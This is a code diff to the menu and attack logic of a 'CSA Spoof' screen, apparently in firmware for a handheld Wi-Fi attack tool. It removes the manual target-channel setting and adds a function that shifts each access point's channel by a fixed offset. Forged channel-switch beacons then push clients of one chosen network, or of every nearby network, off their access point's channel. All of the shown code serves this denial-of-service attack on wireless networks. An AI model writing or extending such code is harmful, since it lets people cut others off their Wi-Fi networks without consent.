@@ -66,15 +66,13 @@ void WifiCsaSpoofScreen::onItemSelected(uint8_t index)
       _showMain();
     } else if (_mode == MODE_TARGET) {
       if (index == 1) _selectWifi();
-      else if (index == 2) { _toChannel = (_toChannel % 13) + 1; _showMain(); }
-      else if (index == 3) {
+      else if (index == 2) {
         if (_target.ssid == "-") ShowStatusAction::show("Access Point not set");
         else _scanClients();
       }
-      else if (index == 4) _startAttack();
+      else if (index == 3) _startAttack();
     } else {  // MODE_ALL
-      if (index == 1) { _toChannel = (_toChannel % 13) + 1; _showMain(); }
-      else if (index == 2) _startAttack();
+      if (index == 1) _startAttack();
     }
   } else if (_state == STATE_SELECT_WIFI) {
     if (index == 0) { _selectWifi(true); return; }
@@ -132,9 +130,9 @@ void WifiCsaSpoofScreen::onUpdate()
   _statusTitle = "CSA Spoof";
 
   if (_mode == MODE_ALL) {
-    _csaAll();
+    _csaAll();   // each AP redirected to its own channel + offset
     _statusDetail = (_allCount == 0) ? String("Scanning...")
-                                     : (String(_allCount) + " APs" + toCh);
+                                     : (String(_allCount) + " APs");
   } else if (_selectedClientCount == 0) {
     if (_attacker) {
       _attacker->channelSwitch(_target.bssid, _target.ssid.c_str(), _target.channel, _toChannel);
@@ -169,31 +167,36 @@ void WifiCsaSpoofScreen::_showMain()
 {
   _state = STATE_MAIN;
   _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
-  _toChannelSub = String("CH ") + String(_toChannel);
   _mainItems[0] = {"Mode", _modeSub.c_str()};
 
   uint8_t itemCount;
   if (_mode == MODE_TARGET) {
     _targetSub = _target.ssid;
     _mainItems[1] = {"Access Point", _targetSub.c_str()};
-    _mainItems[2] = {"To Channel", _toChannelSub.c_str()};
     _clientsSub = _selectedClientCount ? "Custom" : "All";
-    _mainItems[3] = {"Clients", _clientsSub.c_str()};
-    _mainItems[4] = {"Start"};
-    itemCount = 5;
+    _mainItems[2] = {"Clients", _clientsSub.c_str()};
+    _mainItems[3] = {"Start"};
+    itemCount = 4;
   } else {
-    _mainItems[1] = {"To Channel", _toChannelSub.c_str()};
-    _mainItems[2] = {"Start"};
-    itemCount = 3;
+    _mainItems[1] = {"Start"};
+    itemCount = 2;
   }
 
   if (_mainSel >= itemCount) _mainSel = 0;
   setItems(_mainItems, itemCount, _mainSel);
 }
 
+// The redirect channel: the AP's channel shifted by a fixed offset, wrapped
+// into 1..13, so compliant clients move to a different channel than the AP's.
+uint8_t WifiCsaSpoofScreen::_shiftChannel(uint8_t ch)
+{
+  if (ch < 1 || ch > 13) ch = 1;
+  return (uint8_t)(((ch - 1 + kChannelShift) % 13) + 1);
+}
+
 void WifiCsaSpoofScreen::_defaultToChannel()
 {
-  _toChannel = (_target.channel <= 6) ? 11 : 1;
+  _toChannel = _shiftChannel((uint8_t)_target.channel);
 }
 
 void WifiCsaSpoofScreen::_showScanResults()
@@ -400,10 +403,11 @@ void WifiCsaSpoofScreen::_csaAll()
   count = _allCount;
   portEXIT_CRITICAL(&_allLock);
 
-  // Broadcast CSA beacon per AP (changes channel per AP internally).
+  // Broadcast CSA beacon per AP (changes channel per AP internally). Each AP is
+  // redirected to its own channel + offset.
   for (int i = 0; i < count; i++) {
     if (!local[i].valid) continue;
-    _attacker->channelSwitch(local[i].bssid, "", local[i].channel, _toChannel);
+    _attacker->channelSwitch(local[i].bssid, "", local[i].channel, _shiftChannel(local[i].channel));
   }
 
   // Hop to next scan channel after injecting so _beaconCb keeps discovering.
